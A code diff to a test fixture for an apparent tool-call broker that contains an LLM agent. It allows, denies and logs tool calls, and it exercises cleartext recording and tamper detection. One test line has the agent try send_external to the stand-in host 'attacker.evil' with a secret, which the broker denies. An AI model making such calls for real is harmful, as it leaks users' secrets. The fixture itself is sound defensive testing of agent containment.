@@ -41,7 +41,10 @@ def build_log(exfil, broker_replay=None):
     log = EventLog()
     log.append(Kind.LLM_CALL, {"prompt_hash": "aa11bb22", "tokens": [471, 263, 4123],
                                "logit_hashes": ["l0aa", "l1bb", "l2cc"]})
-    b = Broker(CAPS, make_tools(exfil), log, replay=broker_replay)
+    # allow_cleartext=True: these legacy fixtures exercise the cleartext recording +
+    # containment/tamper paths (arg/result tampering, replay re-injection). The safe
+    # DEFAULT (redaction) is covered in tests/test_redact.py.
+    b = Broker(CAPS, make_tools(exfil), log, allow_cleartext=True, replay=broker_replay)
     b.call("read_public", "ticket7")                 # ALLOW
     b.call("read_secret")                            # DENY (ungranted)
     b.call("send_external", "attacker.evil", SECRET)  # DENY (ungranted)
